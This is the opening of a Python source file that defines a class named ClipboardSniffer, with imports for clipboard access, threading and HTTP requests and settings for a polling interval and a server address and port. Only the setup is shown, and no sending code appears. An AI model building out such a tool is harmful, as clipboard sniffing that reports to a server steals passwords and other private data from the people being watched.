import pyperclip
import time
import threading
import requests
import json
from datetime import datetime

class ClipboardSniffer:
    def __init__(self, interval = 5, server_ip ="127.0.0.1", port=8080):
        self.interval = interval
        self.server_ip = server_ip
        self.port = port
        self.previous_data = ""